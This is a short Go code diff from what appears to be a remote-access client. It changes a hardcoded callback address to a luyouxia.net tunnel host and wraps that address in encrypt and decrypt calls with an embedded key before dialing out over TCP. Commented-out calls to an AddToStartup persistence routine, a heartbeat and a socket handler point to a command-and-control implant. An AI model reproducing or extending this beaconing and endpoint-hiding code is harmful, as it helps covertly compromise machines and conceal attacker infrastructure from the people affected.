@@ -17,7 +17,7 @@ import (
 )
 
 const (
-	IP   = "qq80378994.e2.luyouxia.net:28602"
+	IP   = "selectbyylc.e3.luyouxia.net:12863"
 	PORT = 1010
 )
 
@@ -51,9 +51,11 @@ func heartbeat(conn net.Conn) {
 
 func connectNew() {
 	wg.Add(3) // 协程计数器 +1
+	ipEncryptPath, err := util.EncryptString("ylcworld19990709", IP)
+	ipDecryptPath, err := util.DecryptString("ylcworld19990709", ipEncryptPath)
 	//go AddToStartup()
-	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", "selectbyylc.e3.luyouxia.net:12863")
-	//fmt.Println(inetSocketAddress)
+	inetSocketAddress, _ := net.ResolveTCPAddr("tcp", ipDecryptPath)
+
 	socket, err := net.DialTCP("tcp", nil, inetSocketAddress)
 	if err != nil {
 		fmt.Println(err)
@@ -78,7 +80,7 @@ func connectNew() {
 	//fmt.Fprintln(dataOutputStream, "360")
 	//
 	//dataOutputStream.Flush()
-	// 协程计数器加-1
+	////协程计数器加-1
 	//go doSomeThing(socket)
 	//go heartbeat(socket)
 
